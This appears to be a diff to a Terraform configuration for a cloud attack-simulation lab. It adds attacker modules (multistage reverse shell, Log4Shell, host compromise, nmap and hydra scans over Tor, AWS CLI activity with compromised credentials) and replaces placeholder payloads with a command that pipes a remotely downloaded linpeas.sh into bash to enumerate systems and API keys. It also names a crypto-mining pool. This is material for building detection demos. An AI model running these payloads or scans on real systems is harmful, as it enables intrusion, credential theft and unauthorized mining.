@@ -81,6 +81,11 @@ variable "config" {
                 minergate_server            = string
                 minergate_user              = string
               })
+              generate_web_traffic = object({
+                enabled                     = bool
+                delay                       = number
+                urls                        = list(string)
+              })
             })
           })
           attacker = object({
@@ -97,6 +102,15 @@ variable "config" {
                 listen_ip                   = string
                 listen_port                 = number
                 payload                     = string
+              })
+              reverse_shell_multistage = object({
+                enabled                     = bool
+                listen_ip                   = string
+                listen_port                 = number
+                payload                     = string
+                iam2rds_role_name           = string
+                iam2rds_session_name        = string
+                attack_delay                = number
               })
               port_forward = object({
                 enabled                     = bool
@@ -118,6 +132,9 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                reverse_shell               = bool
+                reverse_shell_port          = number
+                attack_delay                = number
               })
               docker_composite_compromised_credentials_attack = object({
                 enabled                     = bool
@@ -193,6 +210,15 @@ variable "config" {
                 nicehash_user               = string
                 compromised_keys_user       = string
                 attack_delay                = number
+              })
+              docker_composite_host_compromise_attack = object({
+                enabled                     = bool
+                attack_delay                = number
+              })
+              generate_web_traffic = object({
+                enabled                     = bool
+                delay                       = number
+                urls                        = list(string)
               })
             })
           })
@@ -262,6 +288,11 @@ variable "config" {
                 minergate_server            = string
                 minergate_user              = string
               })
+              generate_web_traffic = object({
+                enabled                     = bool
+                delay                       = number
+                urls                        = list(string)
+              })
             })
           })
           attacker = object({
@@ -278,6 +309,15 @@ variable "config" {
                 listen_ip                   = string
                 listen_port                 = number
                 payload                     = string
+              })
+              reverse_shell_multistage = object({
+                enabled                     = bool
+                listen_ip                   = string
+                listen_port                 = number
+                payload                     = string
+                iam2rds_role_name           = string
+                iam2rds_session_name        = string
+                attack_delay                = number
               })
               port_forward = object({
                 enabled                     = bool
@@ -299,6 +339,9 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                reverse_shell               = bool
+                reverse_shell_port          = number
+                attack_delay                = number
               })
               docker_composite_compromised_credentials_attack = object({
                 enabled                     = bool
@@ -375,6 +418,15 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
+              docker_composite_host_compromise_attack = object({
+                enabled                     = bool
+                attack_delay                = number
+              })
+              generate_web_traffic = object({
+                enabled                     = bool
+                delay                       = number
+                urls                        = list(string)
+              })
             })
           })
         })
@@ -443,6 +495,34 @@ variable "config" {
                 minergate_server            = string
                 minergate_user              = string
               })
+              docker_nmap = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                ports                       = list(number)
+              })
+              docker_hydra = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                custom_user_list            = list(string)
+                custom_password_list        = list(string)
+                user_list                   = string
+                password_list               = string
+              })
+              generate_web_traffic = object({
+                enabled                     = bool
+                delay                       = number
+                urls                        = list(string)
+              })
+              generate_aws_cli_traffic = object({
+                enabled                     = bool
+                compromised_credentials     = any
+                compromised_keys_user       = string
+                commands                    = list(string)
+              })
             })
           })
           attacker = object({
@@ -459,6 +539,15 @@ variable "config" {
                 listen_ip                   = string
                 listen_port                 = number
                 payload                     = string
+              })
+              reverse_shell_multistage = object({
+                enabled                     = bool
+                listen_ip                   = string
+                listen_port                 = number
+                payload                     = string
+                iam2rds_role_name           = string
+                iam2rds_session_name        = string
+                attack_delay                = number
               })
               port_forward = object({
                 enabled                     = bool
@@ -480,6 +569,9 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                reverse_shell               = bool
+                reverse_shell_port          = number
+                attack_delay                = number
               })
               docker_composite_compromised_credentials_attack = object({
                 enabled                     = bool
@@ -560,6 +652,38 @@ variable "config" {
                 enabled                     = bool
                 attack_delay                = number
               })
+              docker_composite_host_compromise_attack = object({
+                enabled                     = bool
+                attack_delay                = number
+              })
+              docker_nmap = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                ports                       = list(number)
+              })
+              docker_hydra = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                custom_user_list            = list(string)
+                custom_password_list        = list(string)
+                user_list                   = string
+                password_list               = string
+              })
+              generate_web_traffic = object({
+                enabled                     = bool
+                delay                       = number
+                urls                        = list(string)
+              })
+              generate_aws_cli_traffic = object({
+                enabled                     = bool
+                compromised_credentials     = any
+                compromised_keys_user       = string
+                commands                    = list(string)
+              })
             })
           })
         })
@@ -639,6 +763,11 @@ variable "config" {
                 minergate_image             = "mkell43/minerd"
                 minergate_server            = "stratum+tcp://eth.pool.minergate.com:45791"
                 minergate_user              = null
+              },
+              generate_web_traffic = {
+                enabled                     = false
+                delay                       = 60
+                urls                        = []
               }
             }
           }
@@ -664,7 +793,16 @@ variable "config" {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "touch /tmp/pwned"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+              }
+              reverse_shell_multistage = {
+                enabled                     = false
+                listen_ip                   = "0.0.0.0"
+                listen_port                 = "4444"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                iam2rds_role_name           = "rds_user_access_role_ciemdemo"
+                iam2rds_session_name        = "attacker-session"
+                attack_delay                = 50400
               }
               port_forward = {
                 enabled                     = false
@@ -676,7 +814,7 @@ variable "config" {
                 enabled                     = false
                 target_ip                   = null
                 target_port                 = 8089
-                payload                     = "touch /tmp/vuln_npm_app_pwned"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
               }
               docker_log4shell_attack = {
                 enabled                     = false
@@ -685,8 +823,11 @@ variable "config" {
                 attacker_ip                 = null
                 target_ip                   = null
                 target_port                 = null
-                payload                     = "touch /tmp/log4shell_pwned"
-              }
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                reverse_shell               = false
+                reverse_shell_port          = 4444
+                attack_delay                =  50400
+              },
               docker_composite_compromised_credentials_attack = {
                 enabled                     = false
                 compromised_credentials     = {}
@@ -761,6 +902,15 @@ variable "config" {
                 nicehash_user               = null
                 compromised_keys_user       = null
                 attack_delay                =  50400
+              },
+              docker_composite_host_compromise_attack = {
+                enabled                     = false
+                attack_delay                = 50400
+              },
+              generate_web_traffic = {
+                enabled                     = false
+                delay                       = 60
+                urls                        = []
               }
             }
           }
@@ -829,6 +979,11 @@ variable "config" {
                 minergate_image             = "mkell43/minerd"
                 minergate_server            = "stratum+tcp://eth.pool.minergate.com:45791"
                 minergate_user              = null
+              },
+              generate_web_traffic = {
+                enabled                     = false
+                delay                       = 60
+                urls                        = []
               }
             }
           }
@@ -854,7 +1009,16 @@ variable "config" {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "touch /tmp/pwned"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+              }
+              reverse_shell_multistage = {
+                enabled                     = false
+                listen_ip                   = "0.0.0.0"
+                listen_port                 = "4444"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                iam2rds_role_name           = "rds_user_access_role_ciemdemo"
+                iam2rds_session_name        = "attacker-session"
+                attack_delay                = 50400
               }
               port_forward = {
                 enabled                     = false
@@ -866,7 +1030,7 @@ variable "config" {
                 enabled                     = false
                 target_ip                   = null
                 target_port                 = 8089
-                payload                     = "touch /tmp/vuln_npm_app_pwned"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
               }
               docker_log4shell_attack = {
                 enabled                     = false
@@ -875,8 +1039,11 @@ variable "config" {
                 attacker_ip                 = null
                 target_ip                   = null
                 target_port                 = null
-                payload                     = "touch /tmp/log4shell_pwned"
-              }
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                reverse_shell               = false
+                reverse_shell_port          = 4444
+                attack_delay                =  50400
+              },
               docker_composite_compromised_credentials_attack = {
                 enabled                     = false
                 compromised_credentials     = {}
@@ -951,6 +1118,15 @@ variable "config" {
                 nicehash_user               = null
                 compromised_keys_user       = null
                 attack_delay                =  50400
+              },
+              docker_composite_host_compromise_attack = {
+                enabled                     = false
+                attack_delay                = 50400
+              },
+              generate_web_traffic = {
+                enabled                     = false
+                delay                       = 60
+                urls                        = []
               }
             }
           }
@@ -1019,6 +1195,34 @@ variable "config" {
                 minergate_image             = "mkell43/minerd"
                 minergate_server            = "stratum+tcp://eth.pool.minergate.com:45791"
                 minergate_user              = null
+              },
+              docker_nmap = {
+                enabled                     = false
+                use_tor                     = false
+                scan_local_network          = true
+                targets                     = []
+                ports                       = [22,80,443,5000,8000,8080,8091]
+              }
+              docker_hydra = {
+                enabled                     = false
+                use_tor                     = false
+                scan_local_network          = true
+                targets                     = []
+                custom_user_list            = []
+                custom_password_list        = []
+                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
+                password_list               = "/opt/passwords/darkweb2017-top10.txt"
+              }
+              generate_web_traffic = {
+                enabled                     = false
+                delay                       = 60
+                urls                        = []
+              },
+              generate_aws_cli_traffic = {
+                enabled                     = false
+                compromised_credentials     = {}
+                compromised_keys_user       = null
+                commands                    = []
               }
             }
           }
@@ -1044,7 +1248,16 @@ variable "config" {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "touch /tmp/pwned"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+              }
+              reverse_shell_multistage = {
+                enabled                     = false
+                listen_ip                   = "0.0.0.0"
+                listen_port                 = "4444"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                iam2rds_role_name           = "rds_user_access_role_ciemdemo"
+                iam2rds_session_name        = "attacker-session"
+                attack_delay                = 50400
               }
               port_forward = {
                 enabled                     = false
@@ -1056,7 +1269,7 @@ variable "config" {
                 enabled                     = false
                 target_ip                   = null
                 target_port                 = 8089
-                payload                     = "touch /tmp/vuln_npm_app_pwned"
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
               }
               docker_log4shell_attack = {
                 enabled                     = false
@@ -1065,8 +1278,11 @@ variable "config" {
                 attacker_ip                 = null
                 target_ip                   = null
                 target_port                 = null
-                payload                     = "touch /tmp/log4shell_pwned"
-              }
+                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                reverse_shell               = false
+                reverse_shell_port          = 4444
+                attack_delay                =  50400
+              },
               docker_composite_compromised_credentials_attack = {
                 enabled                     = false
                 compromised_credentials     = {}
@@ -1145,6 +1361,38 @@ variable "config" {
               docker_composite_guardduty_attack = {
                 enabled                     = false
                 attack_delay                =  50400
+              },
+              docker_composite_host_compromise_attack = {
+                enabled                     = false
+                attack_delay                = 50400
+              },
+              docker_nmap = {
+                enabled                     = false
+                use_tor                     = true
+                scan_local_network          = false
+                targets                     = []
+                ports                       = [22,80,443,5000,8000,8080,8091]
+              }
+              docker_hydra = {
+                enabled                     = false
+                use_tor                     = true
+                scan_local_network          = false
+                targets                     = []
+                custom_user_list            = []
+                custom_password_list        = []
+                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
+                password_list               = "/opt/passwords/darkweb2017-top10.txt"
+              }
+              generate_web_traffic = {
+                enabled                     = false
+                delay                       = 60
+                urls                        = []
+              },
+              generate_aws_cli_traffic = {
+                enabled                     = false
+                compromised_credentials     = {}
+                compromised_keys_user       = null
+                commands                    = []
               }
             }
           }
